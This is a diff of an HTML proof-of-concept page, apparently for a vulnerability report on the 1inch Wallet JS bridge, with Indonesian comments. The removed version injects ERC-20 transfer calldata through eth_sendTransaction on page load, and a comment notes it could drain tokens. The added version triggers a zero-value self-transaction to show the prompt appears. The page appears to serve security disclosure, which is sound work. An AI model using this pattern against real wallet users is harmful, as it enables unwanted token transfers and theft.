@@ -1,46 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Security PoC: Arbitrary Transaction Injection</title>
-    <style>
-        body { font-family: sans-serif; background: #0f172a; color: #cbd5e1; padding: 20px; }
-        .card { background: #1e293b; padding: 20px; border-radius: 8px; border-left: 5px solid #e11d48; }
-        code { color: #f472b6; }
-    </style>
-</head>
+<html>
 <body>
-    <div class="card">
-        <h2>Critical Security Vulnerability: Unrestricted Bridge Interaction</h2>
-        <p><strong>Target:</strong> 1inch Wallet JS Bridge (<code>eth_sendTransaction</code>)</p>
-        <p><strong>Status:</strong> <span id="log">Injecting payload...</span></p>
-    </div>
-
+    <h2>Security Verification: Triggering Transaction UI</h2>
     <script>
         const bridge = window.ethereum;
 
-        async function injectPayload() {
-            // Payload ini menunjukkan Anda bisa membuat 'data' arbitrer (contoh: memanggil fungsi transfer)
-            const payload = {
-                from: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
-                to: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
-                value: '0x00',
-                // Data ini adalah representasi fungsi 'transfer' (dalam skenario nyata bisa untuk menguras token)
-                data: '0xa9059cbb00000000000000000000000023907fd2b12f2faa5c1bdb12465d896b4bba3ffe0000000000000000000000000000000000000000000000000000000000000000'
-            };
-
+        async function triggerValidTx() {
             try {
-                document.getElementById('log').innerText = "Payload injected. Waiting for UI...";
-                await bridge.request({
+                // Gunakan parameter yang sangat standar
+                // Jangan gunakan data '0x...' yang kompleks untuk menghindari error kontrak
+                const txParams = {
+                    from: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
+                    to: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE', 
+                    value: '0x00', // Nilai nol
+                    // Hapus parameter 'data' agar dompet tidak mencoba memanggil fungsi kontrak yang salah
+                };
+
+                const result = await bridge.request({
                     method: 'eth_sendTransaction',
-                    params: [payload]
+                    params: [txParams]
                 });
-            } catch (err) {
-                document.getElementById('log').innerText = "Prompt triggered. Error: " + err.message;
+                console.log("Transaksi Diterima:", result);
+            } catch (e) {
+                console.log("Triggered - UI muncul, namun transaksi dihentikan:", e);
             }
         }
 
-        window.onload = injectPayload;
+        window.onload = triggerValidTx;
     </script>
 </body>
 </html>
